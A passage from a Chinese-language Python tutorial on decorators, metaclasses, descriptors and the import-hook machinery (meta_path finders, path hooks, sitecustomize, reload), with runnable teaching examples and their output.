decorator pass # ...class staticmethod(object): \"\"\" staticmethod(function) -&gt; method \"\"\" def __init__(self, function): # for @staticmethod decorator pass # ... 装饰器的@语法就等同调用了这两个类的构造函数。 1234567class Foo(object): @staticmethod def bar(): pass # 等同于 bar = staticmethod(bar) 至此，我们上文提到的装饰器接口定义可以更加明确一些，装饰器必须接受一个callable对象，其实它并不关心你返回什么，可以是另外一个callable对象（大部分情况），也可以是其他类对象，比如property。 0x3.6被装饰的函数有不定长参数范例: 1234567891011121314151617181920import timedef timefun(func): def wrapped_func(*args, **kwargs): print(\"%s called at %s\" % (func.__name__, time.ctime())) func(*args, **kwargs) return wrapped_func@timefundef foo(a, b, c, d=\"foo原代码\"): time.sleep(0.8) print(a + b + c) print(d)foo(3, 5, 7)output:foo called at Fri May 31 16:18:22 201915foo原代码 wrapper参数为args, *kwargs。 args表示的参数以列表的形式传入；*kwargs表示的参数以字典的形式传入： 从图中我们可以看到：凡是以key=value形式的参数均存在kwargs中，剩下的所有参数都以列表的形式存于args中。这里要注意的是：为了不破坏原函数的逻辑，我们要保证内层函数wrapper_func和被装饰函数func的传入参数和返回值类型必须保持一致。 0x3.7装饰器顺序一个函数还可以同时定义多个装饰器，比如： 12345@a@b@cdef f (): pass 它的执行顺序是从里到外，最先调用最里层的装饰器，最后调用最外层的装饰器，它等效于 1f = a(b(c(f))) 0x3.8装饰器的错误使用装饰器可以让你代码更加优雅，减少重复，但也不全是优点，也会带来一些问题。 *0x3.8.1位置错误的代码 *让我们直接看示例代码。 12345678910111213141516171819Pythondef html_tags(tag_name): print 'begin outer function.' def wrapper_(func): print \"begin of inner wrapper function.\" def wrapper(*args, **kwargs): content = func(*args, **kwargs) print \"&lt;&#123;tag&#125;&gt;&#123;content&#125;&lt;/&#123;tag&#125;&gt;\".format(tag=tag_name, content=content) print 'end of inner wrapper function.' return wrapper print 'end of outer function' return wrapper_@html_tags('b')def hello(name='Toby'): return 'Hello &#123;&#125;!'.format(name)hello()hello() 在装饰器中我在各个可能的位置都加上了print语句，用于记录被调用的情况。你知道他们最后打印出来的顺序吗？如果你心里没底，那么最好不要在装饰器函数之外添加逻辑功能，否则这个装饰器就不受你控制了。以下是输出结果： 1234567Pythonbegin outer function.end of outer functionbegin of inner wrapper function.end of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;&lt;b&gt;Hello Toby!&lt;/b&gt; 0x3.8.2错误的函数签名和文档装饰器装饰过的函数看上去名字没变，其实已经变了。 12345678910111213def logging(func): def wrapper(*args, **kwargs): \"\"\"print log before a function.\"\"\" print \"[DEBUG] &#123;&#125;: enter &#123;&#125;()\".format(datetime.now(), func.__name__) return func(*args, **kwargs) return wrapper@loggingdef say(something): \"\"\"say something\"\"\" print \"say &#123;&#125;!\".format(something)print say.__name__ # wrapper 为什么会这样呢？只要你想想装饰器的语法糖@代替的东西就明白了。@等同于这样的写法。 1say = logging(say) logging其实返回的函数名字刚好是wrapper，那么上面的这个语句刚好就是把这个结果赋值给say，say的name自然也就是wrapper了，不仅仅是name，其他属性也都是来自wrapper，比如doc，source等等。 使用标准库里的functools.wraps，可以基本解决这个问题。 1234567891011121314151617from functools import wrapsdef logging(func): @wraps(func) def wrapper(*args, **kwargs): \"\"\"print log before a function.\"\"\" print \"[DEBUG] &#123;&#125;: enter &#123;&#125;()\".format(datetime.now(), func.__name__) return func(*args, **kwargs) return wrapper@loggingdef say(something): \"\"\"say something\"\"\" print \"say &#123;&#125;!\".format(something)print say.__name__ # sayprint say.__doc__ # say something 看上去不错！主要问题解决了，但其实还不太完美。因为函数的签名和源码还是拿不到的。 123import inspectprint inspect.getargspec(say) # failedprint inspect.getsource(say) # failed 如果要彻底解决这个问题可以借用第三方包，比如wrapt。后文有介绍。 0x3.8.3不能装饰@staticmethod 或者 @classmethod当你想把装饰器用在一个静态方法或者类方法时，不好意思，报错了。 1234567891011121314151617181920212223242526Pythonclass Car(object): def __init__(self, model): self.model = model @logging # 装饰实例方法，OK def run(self): print \"&#123;&#125; is running!\".format(self.model) @logging # 装饰静态方法，Failed @staticmethod def check_model_for(obj): if isinstance(obj, Car): print \"The model of your car is &#123;&#125;\".format(obj.model) else: print \"&#123;&#125; is not a car!\".format(obj)\"\"\"Traceback (most recent call last):... File \"example_4.py\", line 10, in logging @wraps(func) File \"C:\\Python27\\lib\\functools.py\", line 33, in update_wrapper setattr(wrapper, attr, getattr(wrapped, attr))AttributeError: 'staticmethod' object has no attribute '__module__'\"\"\" 前面已经解释了@staticmethod这个装饰器，其实它返回的并不是一个callable对象，而是一个staticmethod对象，那么它是不符合装饰器要求的（比如传入一个callable对象），你自然不能在它之上再加别的装饰器。要解决这个问题很简单，只要把你的装饰器放在@staticmethod之前就好了，因为你的装饰器返回的还是一个正常的函数，然后再加上一个@staticmethod是不会出问题的。 12345678class Car(object): def __init__(self, model): self.model = model @staticmethod @logging # 在@staticmethod之前装饰，OK def check_model_for(obj): pass 0x4元类编程要搞懂元类，我们还是先从对象说起。0x4.1元类的理解0x4.1.1对象（Object）Python 一切皆对象，这句话你一定有听说过（现在你就听说了），一个数字是对象，一个字符串是对象，一个列表是对象，一个字典是对象，例如： 1234&gt;&gt;&gt; i = 10&gt;&gt;&gt; s = \"abc\"&gt;&gt;&gt; nums = [1,2,3]&gt;&gt;&gt; dicts = &#123;\"name\":\"zhang\"&#125; 等号右边是对象，左边是给这些对象取的名字，任何对象都有3个关键属性：标识、值、类型。 标识 标识就和人的身份证ID一样，每个对象有唯一ID标识，在整个生命周期中都不会变，你可以认为标识是这个对象在计算机内存中的地址。通过函数 id() 可以查看对象的ID标识。 1234&gt;&gt;&gt; id(i)40592592&gt;&gt;&gt; id(s)44980584 对象值 对象的第二个属性是值，值很好理解，比如 i 的值是 10，s 的值是 abc，nums 的值就是 1,2,3。 类型 对象还有一个很重要的属性就是类型，任何对象都有属于自己的类型，对象就是由它的类型构造出来的，比如上面的 i 的类型是 int 类型，这个对象就是由 int 构造出来的。s 类型是字符串类型，nums 的类型是列表类型，dicts 的类型是字典类型，它们都是由对应的类型构建出来的。 通过 type() 可以查看对象的类型。 12345678&gt;&gt;&gt; type(i)&lt;class 'int'&gt;&gt;&gt;&gt; type(s)&lt;class 'str'&gt;&gt;&gt;&gt; type(nums)&lt;class 'list'&gt;&gt;&gt;&gt; type(dicts)&lt;class 'dict'&gt; 对象的类型也和ID标识一样，确定好之后就不会再变化了。 0x4.1.2类与（实例）对象除了系统已经定义好了的整数类型，字符串类型，列表等类型之外，我们还可以创建自己的类型，用关键字 class 来定义。例如： 1234567&gt;&gt;&gt; class Person: # 这里的 self 指某个实例对象自己... def __init__(self, name): # name 是实例的属性... self.name = name # live 是类的属性 live = True 这里的 Person 就是自定义类，类是一个抽象的模版，既不指张三也不是李四，现在我们可以通过调用这个类来构造（实例化）出一个具体的，实在的，有名字的对象出来，这个对象称之为实例对象。 1234567&gt;&gt;&gt; p1 = Person(\"zhangsan\")&gt;&gt;&gt; p1.name'zhangsan'&gt;&gt;&gt;&gt;&gt;&gt; p2 = Person(\"lisi\")&gt;&gt;&gt; p2.name'lisi' 这里的 p1、p2 就是实例化之后的（实例）对象，这两个对象的类型都是 Person 类，类与（实例）对象的关系就像一个车辆模具与一辆被造出来的真实车的关系一样。 1234&gt;&gt;&gt; p1&lt;__main__.Person object at 0x0195AA30&gt;&gt;&gt;&gt; type(p1)&lt;class '__main__.Person'&gt; # 这里的__main__是模块名称 0x4.13类也是对象（又叫类对象）刚刚我们说了一切都是对象，实例（真实车）是对象，类（模具）当然也是对象，因为它也是个实实在在存在的东西， 当 Python 解释器执行到关键字 class 这个指令的时候，在内部就会创建一个名为 “Person” 的类，这个类也是个对象，我们称之为类对象（注意区别实例对象），它一样有ID标识、有类型、有值。例如： 123456&gt;&gt;&gt; id(Person)26564024&gt;&gt;&gt; type(Person)&lt;class 'type'&gt;&gt;&gt;&gt; Person&lt;class '__main__.Person'&gt; 我们注意到这个 Person 这个类对象的类型叫 “type”，也就是说 Person 类是由 type 创建出来的，现在你要记住，p1，p2 是实例对象，而 Person 是类对象。另外，这个 type 是什么鬼？ 我们来回顾一下，实例对象 p1 的类型是类对象 Person，Person 的类型 type 12345&gt;&gt;&gt; nums = [1,2,3]&gt;&gt;&gt; type(nums)&lt;class 'list'&gt;&gt;&gt;&gt; type(list)&lt;class 'type'&gt; nums 的类型是 list，list 的类型也是 type，字典类（dict）的类型也是 type，所有类的类型都是 type，也就是说所有的类都是由type 创建的。这个 type 就是元类，道生一，一生二，三生万物，元类就是 Python 中的造物主。（元类自己也是对象）现在我们都知道类（对象）可以使用 class 关键字创建，我们还知道类（对象）的类型是 type，既然知道了它的类型是 type，那么肯定可以通过 type（元类）来创建 0x4.2类的创建0x4.2.1类是动态创建的我们知道，类(class)可以有多个实例(instance)。而创建实例的方法就是调用类的构造函数(constructor)： 123456class Spam(object): def __init__(self, name): self.name = namespam = Spam('name') 上例我们定义了一个类，并调用类的构造函数创建了该类的一个实例。我们知道类也可以看作类 type 的一个实例，那么如何用 type 的构造函数来动态创建一个类呢？我们先看看 type 的构造函数： type(name, bases, dict): name: 字符串类型，存放新类的名字 bases: 元组(tuple)类型，指定类的基类/父类 dict: 字典类型，存放该类的所有属性(attributes)和方法(method) 例如下面的类： 12345678910class Base: counter = 10class Derived(Base): def get_counter(self): return self.counterx = Derived()x.get_counter()#&gt; 10 我们可以调用 type(…) 来动态创建这两个类： 123456Base = type('Base', (), &#123;'counter': 10&#125;)Derived = type('Derived', (Base,), dict(get_counter=lambda self: self.counter))x = Derived()x.get_counter()#&gt; 10 是的，你没有猜错，Python 在遇到 class … 关键字时会一步步解析类的内容，最终调用 type(…) （准确说是指定的元类）的构造函数来创建类，换句话说上面两种定义类的方式是等价的。在下节我们会具体讲解。0x4.2.2类的创建过程 要了解元类(meta-class)的作用，我们就需要了解 Python 里类的创建过程 ，如下： 当 Python 见到 class 关键字时，会首先解析 class … 中的内容。例如解析基类信息，最重要的是找到对应的元类信息（默认是 type)。 元类找到后，Python 需要准备 namespace （也可以认为是上节中 type 的 dict 参数）。如果元类实现了 prepare 函数，则会调用它来得到默认的 namespace 。 之后是调用 exec 来执行类的 body，包括属性和方法的定义，最后这些定义会被保存进 namespace。 上述步骤结束后，就得到了创建类需要的所有信息，这时 Python 会调用元类的构造函数来真正创建类。 如果你想在类的创建过程中做一些定制(customization)的话，创建过程中任何用到了元类的地方，我们都能通过覆盖元类的默认方法来实现定制。这也是元类“无所不能”的所在，它深深地嵌入了类的创建过程。 0x4.3元类的定义和使用 元类继承自type,行为通过实现 __new__(meta,name,bases,class_dict) 类似于类中的__new__,用于定义元类的创建行为 __init__(cls, name, bases,attr_dict) 类似于类中的__init__,用于初始化元类,通过元类产生类时会用到. __call__(cls) 定义类实例化时的行为. 类方法__prepare__(meta, name, bases) 解释器调用元类的__new__方法之前会先调用__prepare__方法,使用类定义体中的属性创建映射.__prepare__方法的第一个参数是元类,随后两个参数分别是要构建的类的名称和基类组成的元组,返回值必须是映射.元类构建新类时,__prepare__方法返回的映射会传给__new__ 方法的最后一个参数,然后再传给__init__ 方法. 使用元类的类实例化产出类的顺序是: meta.__prepare__ meta.__new__ meta.__init__ 类实例化对象的顺序是: clz.__call__ clz.__new__ clz.__init__ 实例: 123456789101112131415161718192021222324252627282930313233343536373839class meta_A(type): def __call__(clz,*args, **kwargs): print(\"clz.call\") return super().__call__(*args, **kwargs) def __new__(meta,name,bases,class_dict): print(\"meta.new\") return type.__new__(meta,name,bases,class_dict) def __init__(cls, name, bases,attr_dict): print(\"meta.init\") super().__init__(name, bases,attr_dict) @classmethod def __prepare__(meta, name, bases): print('meta.prepare') return dict()class A(metaclass = meta_A): def __new__(cls,*args, **kwargs): print('clz.new') return super().__new__(cls) def __init__(self,name): self.name=name print('clz.init')output:meta.preparemeta.newmeta.inita = A(\"qw\")output:clz.callclz.newclz.initprint(a.name)output:qw 0x4.4元类的应用 元类就是深度的魔法，99%的用户应该根本不必为此操心。如果你想搞清楚究竟是否需要用到元类，那么你就不需要它。那些实际用到元类的人都非常清楚地知道他们需要做什么，而且根本不需要解释为什么要用元类。 0x.4.4.1强制子类实现特定方法假设你是一个库的作者，例如下面的代码，其中的方法 foo 要求子类实现方法 bar ： 123456789# library codeclass Base(object): def foo(self): return self.bar()# user codeclass Derived(Base): def bar(): return None 但作为库的作者，我们根本无法预测用户会写出什么样的代码，有什么方法能强制用户在子类中实现方法 bar 呢？用 meta-class 可以做到。 123456789101112131415161718class Meta(type): def __new__(cls, name, bases, namespace, **kwargs): if name != 'Base' and 'bar' not in namespace: raise TypeError('bad user class') return super().__new__(cls, name, bases, namespace, **kwargs)class Base(object, metaclass=Meta): def foo(self): return self.bar()现在，我们尝试定义一个不包含 bar 方法的子类，在类的定义（或者说生成）阶段就会报错：&gt;&gt;&gt; class Derived(Base):... pass...Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt; File \"&lt;stdin&gt;\", line 4, in __new__TypeError: bad user class 0x4.4.2注册所有子类有时我们会希望获取继承了某个类的子类，例如，实现了基类 Fruit，想知道都有哪些子类继承了它，用元类就能实现这个功能： 123456789101112131415161718class Meta(type): def __init__(cls, name, bases, namespace, **kwargs): super().__init__(name, bases, namespace, **kwargs) if not hasattr(cls, 'registory'): # this is the base class cls.registory = &#123;&#125; else: # this is the subclass cls.registory[name.lower()] = clsclass Fruit(object, metaclass=Meta): passclass Apple(Fruit): passclass Orange(Fruit): pass 之后，我们可以查看所有 Fruit 的子类： 12&gt;&gt;&gt; Fruit.registory&#123;'apple': &lt;class '__main__.Apple'&gt;, 'orange': &lt;class '__main__.Orange'&gt;&#125; new vs init上面的例子中我们分别用了 __new__和 __init__，但其实这两个例子里用哪种方法都是可行的。 __new__用来创建一个（未初始化）实例；__init__则是用来初始化一个实例。在元类的 __new__方法中，因为类实例还没有创建，所以可以更改最后生成类的各项属性：诸如名称，基类或属性，方法等。而在 __init__ 中由于类已经创建完成，所以无法改变。正常情况下不需要关心它们的区别。 0x4.5__metaclass__的属性你可以在写一个类的时候为其添加 __metaclass__ 属性， 定义了__metaclass__就定义了这个类的元类。 123&gt;&gt;&gt; class Foo(object):... __metaclass__ = something...... [...] 例如：当我们写如下代码时： 12&gt;&gt;&gt; class Foo(Bar):... pass 在该类定义的时候，并未在内存中生成，直到它被调用， Python做了如下的操作： Foo中有metaclass属性吗？如果是，Python会在内存中通过metaclass创建一个名字为Foo的类对象（这边是类对象，请注意） 如果Python没有找到metaclass, 它会继续在父类中寻找metaclass属性，并尝试做和前面同样的操作 如果Python在任何父类中都找不到metaclass， 它就会在模块层次中去寻找metaclass， 并尝试做同样的操作 如果还是找不到metaclass， Python会用内置的type来创建这个类对象 0x5描述符创建一个描述符类，它的实例对象作为另一个类的属性。0x5.1描述符定义 一个描述符是一个有“绑定行为”的对象属性(object attribute)，它的访问控制会被描述器协议方法重写。 任何定义了 __get__, __set__ 或者 __delete__ 任一方法的类称为描述符类，其实例对象便是一个描述符，这些方法称为描述符协议。 当对一个实例属性进行访问时，Python 会按 obj.__dict__ → type(obj).__dict__ → type(obj)的父类.__dict__ 顺序进行查找，如果查找到目标属性并发现是一个描述符，Python 会调用描述符协议来改变默认的控制行为。 描述符是 @property@classmethod@staticmethod 和 super 的底层实现机制。 0x5.2描述符的特性 同时定义了__get__和__set__的描述符称为 数据描述符(data descriptor)；仅定义了__get__ 的称为 非数据描述符(non-data descriptor) 。两者区别在于：如果obj.__dict__中有与描述符同名的属性，若描述符是数据描述符，则优先调用描述符，若是非数据描述符，则优先使用 obj.__dict__ 中属性。 描述符协议必须定义在类的层次上，否则无法被自动调用。 0x5.3描述符协议 __get__(self, instance, owner) :param self: 描述符对象本身 :param instance: 使用描述符的对象的实例 :param owner: 使用描述符的对象拥有者 __set__(self, instance, value) :param value: 对描述符的赋值 __delete__(self, instance) 0x5.4描述符发挥作用的地方decriptor发挥作用的时候就在于执行这3类操作的时候： 当访问x.d的时候，将自动调用描述符类中的__get__ 当赋值x.d的时候，将自动调用描述符类中的__set__ 当删除x.d的时候，将自动调用描述符类中的__delete__ 0x5.5描述符的实例首先定义一个数据描述符类 1234567891011class Descriptor(object): def __init__(self, value): self.value = value def __get__(self, instance, owner): print \"访问属性\" return self.value def __set__(self, instance, value): print \"设置属性值\" self.value = value 再来定义一个调用数据描述符的类 12345class Myclass(object): desc = Descriptor(5)if __name__ == '__main__': print Myclass.desc 访问结果为： 12访问属性5 发现访问Myclass的desc属性时，调用了描述符的__get__()方法。这就达到了描述符的作用（可以改变对象属性的访问） 调用原理：对于类属性描述符，如果解析器发现属性x是一个描述符的话，在内部通过type.__getattribute__()（访问属性时无条件调用，最先调用），它能把Class.x转换成Class.__dict__[‘x’].__get__(None, Class)来访问 0x5.6python中访问一个属性的优先级上面把描述符定义成了类属性，那我们要把他定义成对象属性会有什么样的异同呢？ 12345678910111213141516171819202122class Descriptor(object): def __init__(self, value): self.value = value def __get__(self, instance, owner): print(\"访问属性\") return self.value def __set__(self, instance, value): print(\"设置属性值\") self.value = valueclass Myclass(object): desc = Descriptor(5) def __init__(self, desc): self.desc = desc # 与类属性同名的属性if __name__ == '__main__': myclass = Myclass(3) print(myclass.desc) 可以看出初始化时访问了描述符的__set__()方法，访问属性值时访问了描述符的__get__()方法。这样为什么又调用描述符的方法了呢？为了解释这个问题，我们要先说一下在python中访问一个属性的优先级，如下： 类属性 数据描述符 实例属性 非数据描述符 默认为getattr()（找不到的情况下） 然后我们打印出上面代码类和实例的属性列表： 1234if __name__ == '__main__': myclass = Myclass(3) print \"instance: \", myclass.__dict__ print \"Class: \", Myclass.__dict__ 结果如下： 123设置属性值instance: &#123;&#125;Class: &#123;'__module__': '__main__', 'desc': &lt;__main__.Descriptor object at 0x000001DE4C0959B0&gt;, '__init__': &lt;function Myclass.__init__ at 0x000001DE4C092488&gt;, '__dict__': &lt;attribute '__dict__' of 'Myclass' objects&gt;, '__weakref__': &lt;attribute '__weakref__' of 'Myclass' objects&gt;, '__doc__': None&#125; 可以发现实例对象的属性中并没有desc，而相反，类属性中却有它。这是为什么呢？ 按照上面的属性访问优先级的理论，数据描述符 &gt; 实例属性。当python发现实例对象的字典中有与定义的描述符有相同名字的对象时，描述符优先，会覆盖掉实例属性。python会改写默认的行为，去调用描述符的方法来代替。 我们来验证一下上面的理论，优先级实例属性 &gt; 非数据描述符。首先我们定义一下非数据描述符（只有__get__()方法） 12345678910111213141516171819202122232425# coding=utf-8class Descriptor(object): def __init__(self, value): self.value = value def __get__(self, instance, owner): print(\"访问属性\") return self.value # def __set__(self, instance, value): # print \"设置属性值\" # self.value = valueclass Myclass(object): desc = Descriptor(5) def __init__(self, desc): self.desc = desc # 与类属性同名的属性if __name__ == '__main__': myclass = Myclass(3) print(myclass.desc) print(\"instance: \", myclass.__dict__) print(\"Class: \", Myclass.__dict__) 结果如下： 1233instance: &#123;'desc': 3&#125;Class: &#123;'__module__': '__main__', 'desc': &lt;__main__.Descriptor object at 0x000001E2CC10C9B0&gt;, '__init__': &lt;function Myclass.__init__ at 0x000001E2CC333400&gt;, '__dict__': &lt;attribute '__dict__' of 'Myclass' objects&gt;, '__weakref__': &lt;attribute '__weakref__' of 'Myclass' objects&gt;, '__doc__': None&#125; 可以看出，这种情况下访问实例属性，并没有调用描述符的__get__()方法。而是调用了本身的属性。可以看出理论是正确的。 0x5.6使用属性修饰符@property创建描述符 123456789101112131415161718192021222324class PropertyDesc(object): def __init__(self): self._name = '' @property def name(self): print(\"Getting: %s\" % self._name) return self._name @name.setter def name(self, value): print(\"Setting: %s\" % value) self._name = value @name.deleter def name(self): print(\"Deleting: %s\" %self._name) del self._nameif __name__ == '__main__': pro = PropertyDesc() pro.name = \"haha\" print(pro.name) del pro.name 运行结果如下： 1234Setting: hahaGetting: hahahahaDeleting: haha 0x6import hookimport hook 通常被译为 探针。我们可以认为每当导入模块的时候，所触发的操作就是 import hook。使用import 的 hook 机制可以让我们做很多事情，比如加载网络上的模块，在导入模块时对模块进行修改，自动安装缺失模块，上传审计信息，延迟加载等等。 理解 import hook 需要先了解 Python 导入模块的过程。*0x6.1导入过程 *Python 通常使用 import 语句来实现类库的引用，当然内建的 __import__() 函数等都能实现。 import 语句负责做两件事： 查找模块 加载模块到当前名字空间 那么，一个模块的导入过程大致可以分为三个步骤：搜索、加载 和 名字绑定。 0x6.1.1 搜索搜索是整个导入过程的核心，也是最为复杂的一步。这个过程主要是完成查找要引入模块的功能，查找的过程如下： 在缓存 sys.modules 中查找要导入的模块，若找到则直接返回该模块对象 如果在 sys.modules 中没有找到相应模块的缓存，则顺序搜索 sys.meta_path，逐个借助其中的 finder 来查找模块，若找到则加载后返回相应模块对象。 如果以上步骤都没找到该模块，则执行默认导入。即如果模块在一个包中（如import a.b），则以 a.path 为搜索路径进行查找；如果模块不在一个包中（如import a），则以 sys.path 为搜索路径进行查找。 如果都未找到，则抛出 ImportError 异常。 查找过程也会检查⼀些隐式的 finder 对象，不同的 Python 实现有不同的隐式finder，但是都会有 sys.path_hooks, sys.path_importer_cache 以及sys.path。 0x6.1.2加载对于搜索到的模块，如果在缓存 sys.modules 中则直接返回模块对象，否则就需要加载模块以创建一个模块对象。加载是对模块的初始化处理，包括以下步骤： 设置属性：包括 __name__、__file__、__package__、__loader__ 和 __path__ 等 编译源码：将模块文件（对于包，则是其对应的 __init__.py 文件）编译为字节码（*.pyc 或者 *.pyo），如果字节码文件已存在且仍然是最新的，则不重新编译 执行字节码：执行编译生成的字节码（即模块文件或 __init__.py文件中的语句） 需要注意的是，加载不只是发生在导入时，还可以发生在 reload 时。 0x6.1.3 名字绑定加载完模块后，作为最后一步，import 语句会为 导入的对象 绑定名字，并把这些名字加入到当前的名字空间中。其中，导入的对象 根据导入语句的不同有所差异： 如果导入语句为 import obj，则对象 obj 可以是包或者模块 如果导入语句为 from package import obj，则对象 obj 可以是 package 的子包、package 的属性或者 package 的子模块 如果导入语句为 from module import obj，则对象 obj 只能是 module 的属性 0x6.2模块缓存进行搜索时，搜索的第一个地方是便是 sys.modules。sys.modules 是一个字典，键字为模块名，键值为模块对象。它包含了从 Python 开始运行起，被导入的所有模块的一个缓存，包括中间路径。所以，假如 foo.bar.baz 前期已被导入，那么，sys.modules 将包含进入 foo，foo.bar 和 foo.bar.baz的入口。每个键都有自己的数值，都有对应的模块对象。也就是说，如果导入 foo.bar.baz 则整个层次结构下的模块都被加载到了内存。 可以删除 sys.modules 中对应的的键或者将值设置为 None 来使缓存无效。 当启动 Python 解释器时，打印一下 sys.modules 中的 key： 123&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.modules.keys()['copy_reg', 'sre_compile', '_sre', 'encodings', 'site', '__builtin__', 'sysconfig', '__main__', 'encodings.encodings', 'abc', 'posixpath', '_weakrefset', 'errno', 'encodings.codecs', 'sre_constants', 're', '_abcoll', 'types', '_codecs', 'encodings.__builtin__', '_warnings', 'genericpath', 'stat', 'zipimport', '_sysconfigdata', 'warnings', 'UserDict', 'encodings.utf_8', 'sys', 'codecs', 'readline', '_sysconfigdata_nd', 'os.path', 'sitecustomize', 'signal', 'traceback', 'linecache', 'posix', 'encodings.aliases', 'exceptions', 'sre_parse', 'keyrings', 'os', '_weakref'] 可以看出一些模块已经被解释器导入，但是我们却不能直接使用这些模块。这是因为这些模块还没有被绑定到当前名字空间，仍然需要执行 import 语句才能完成名字绑定。 0x6.3查找器和加载器 在搜索过程中我们提到 sys.meta_path 中保存了一些 finder 对象。在 Python 查找的时候，如果在 sys.modules 中没有查找到，就会依次调用 sys.meta_path 中的 finder 对象，即调用导入协议来查找和加载模块。导入协议包含两个概念性的对象，查找器（loader） 和 加载器（loader）。sys.meta_path 在任何默认查找程序或 sys.path 之前搜索。默认的情况下，在 Python2 中 sys.meta_path 是一个空列表，并没有任何 finder 对象；而在 Python3 中则在 Python 中则默认包含三个查找器：第一个知道如何定位内置模块，第二个知道如何定位冻结模块，第三个搜索模块的导入路径： 1[&lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib.PathFinder'&gt;] 在 Python 中，不仅定义了 finder 和 loader 的概念，还定义了 importor 的概念： 查找器（finder）： 决定自己是否能够通过运用其所知的任何策略找到相应的模块。在 Python2 中，finder 对象必须实现 find_module() 方法，在 Python3 中必须要实现 find_module() 或者 find_loader（) 方法。如果 finder 可以查找到模块，则会返回一个 loader 对象(在 Python 3.4中，修改为返回一个模块分支module specs，加载器在导入中仍被使用，但几乎没有责任)，没有找到则返回 None。 加载器（loader）： 负责加载模块，它必须实现一个 load_module() 的方法 导入器（importer）： 实现了 finder 和 loader 这两个接口的对象称为导入器 我们可以想 sys.meta_path 中添加一些自定义的加载器，来实现在加载模块时对模块进行修改。例如一个简单的例子，在每次加载模块时打印模块信息： 1234567891011import sysclass Watcher(object): @classmethod def find_module(cls, name, path, target=None): print(\"Importing\", name, path, target) return Nonesys.meta_path.insert(0, Watcher)import subprocess 输出结果： 12345678910111213141516171819Importing subprocess None NoneImporting time None NoneImporting signal None NoneImporting enum None NoneImporting errno None NoneImporting threading None NoneImporting traceback None NoneImporting linecache None NoneImporting tokenize None NoneImporting re None NoneImporting sre_compile None NoneImporting _sre None NoneImporting sre_parse None NoneImporting sre_constants None NoneImporting copyreg None NoneImporting token None NoneImporting _weakrefset None NoneImporting msvcrt None NoneImporting _winapi None None 0x6.4导入钩子程序Python 的导入机制被设计为可扩展的，其基础的运行机制便是 import hook（导入钩子程序）。Python 存在两种导入钩子程序的形态：一类是上文提到的 meta hook（元钩子程序）， 另一类是 path hook（导入路径钩子程序）。 在其他任何导入程序运行之前，除了 sys.modules 缓存查找，在导入处理开始时调用元钩子程序。这就允许元钩子程序覆盖 sys.path 处理程序，冻结模块，或甚至内建模块。可以通过给 sys.meta_path 添加新的查找器对象来注册元钩子程序。 当相关路径项被冲突时，导入路径钩子程序作为 sys.path (或者 package.path) 处理程序的一部分被调用。可以通过给 sys.path_hooks 添加新的调用来注册导入路径钩子程序。 sys.path_hooks 是由可被调用的对象组成，它会顺序的检查以决定他们是否可以处理给定的 sys.path 的一项。每个对象会使用 sys.path 项的路径来作为参数被调用。如果它不能处理该路径，就必须抛出 ImportError 异常，如果可以，则会返回一个 importer 对象。之后，不会再尝试其它的 sys.path_hooks 对象，即使前一个 importer 出错了。 通过 import hook 我们可以根据需求来扩展 Python 的 import 机制。一个简单的使用导入钩子的实例，在 import 时判断库是否被安装，否则就自动安装： 1234567891011121314151617181920from __future__ import print_functionimport sysimport pipfrom importlib import import_moduleclass AutoInstall(object): _loaded = set() @classmethod def find_module(cls, name, path, target=None): if path is None and name not in cls._loaded: cls._loaded.add(name) print(\"Installing\", name) installed = pip.main([\"install\", name]) if installed == 0: return import_module(name) else: return Nonesys.meta_path.append(AutoInstall) Python 还提供了一些模块和函数，可以用来实现简单的 import hook，主要有一下几种： __import__: Python 的内置函数； imputil: Python 的 import 工具库，在 Python2.6 被声明废弃，Python3 中彻底移除； imp: Python2 和 Python3 都存在的一个 import 库； importlib: Python3 中最新添加，backport 到 Python2.7，但只有很小的子集（只有一个 import_module 函数）。 0x6.5site 模块site 模块用于 python 程序启动的时候，做一些自定义的处理。在 Python 程序运行前，site 模块会自动导入，并按照如下顺序完成初始化工作: 将 sys.prefix 、sys.exec_prefix 和 lib/pythonX.Y/site-packages 合成 module 的 search path。加入sys.path。eg: /home/jay/env/tornado/lib/python2.7/site-packages 在添加的路径下寻找 pth 文件。 该文件中描述了添加到 sys.path 的子文件夹路径。 import sitecustomize， sitecustomize 内部可以做任意的设置。 import usercustomize， usercustomize 一般放在用户的 path 环境下， 如: /home/jay/.local/lib/python2.7/site-packages/usercustomize， 其内部可以做任意的设置。 site 模块的本质可以说是补充 sys.path 路径，协助解释器预配置第三方模块目录。所以可以设置特殊的 sitecustomize.py 或者 usercustomize.py 文件, 在 python 代码执行之前，添加 import hook。 0x6.6导入搜索路径 Python 在 import 时会在系统中搜索模块或者包所在的位置，sys.path 变量中保存了所有可搜索的库路径，它是一个路径名的列表，其中的路径主要分为以下几部分： 程序主目录（默认定义）： 如果是以脚本方式启动的程序，则为启动脚本所在目录；如果在交互式解释器中，则为当前目录； PYTHONPATH目录（可选扩展）： 以 os.pathsep 分隔的多个目录名，即环境变量 -os.environ[‘PYTHONPATH’]（类似 shell 环境变量 PATH）； 标准库目录（默认定义）： Python 标准库所在目录（与安装目录有关）； .pth文件目录（可选扩展）： 以 “.pth” 为后缀的文件，其中列有一些目录名（每行一个目录名）。 因此如果想要添加库的搜索路径，可以有如下方法： 直接修改 sys.path 列表 使用 PYTHONPATH 扩展 使用 .pth 文件扩展 0x6.7重新加载关于 import，还有一点非常关键：加载只在第一次导入时发生。Python 这样设计的目的是因为加载是个代价高昂的操作。 通常情况下，如果模块没有被修改，这正是我们想要的行为；但如果我们修改了某个模块，重复导入不会重新加载该模块，从而无法起到更新模块的作用。有时候我们希望在 运行时（即不终止程序运行的同时），达到即时更新模块的目的，内建函数 reload() 提供了这种 重新加载 机制（在 Python3 中被挪到了 imp 模块下）。 关于 reload 与 import 的不同： import 是语句，而 reload 是函数 import 使用 模块名，而 reload 使用 模块对象（即已被import语句成功导入的模块） 重新加载 reload(module) 有以下几个特点： 会重新编译和执行模块文件中的顶层语句 会更新模块的名字空间（字典 M.__dict__）：覆盖相同的名字（旧的有，新的也有），保留缺失的名字（旧的有，新的没有），添加新增的名字（旧的没有，新的有） 对于由 import M 语句导入的模块 M：调用 reload(M) 后，M.x 为 新模块 的属性 x（因为更新M后，会影响M.x的求值结果） 对于由 from M import x 语句导入的属性 x：调用 reload(M) 后，x 仍然是 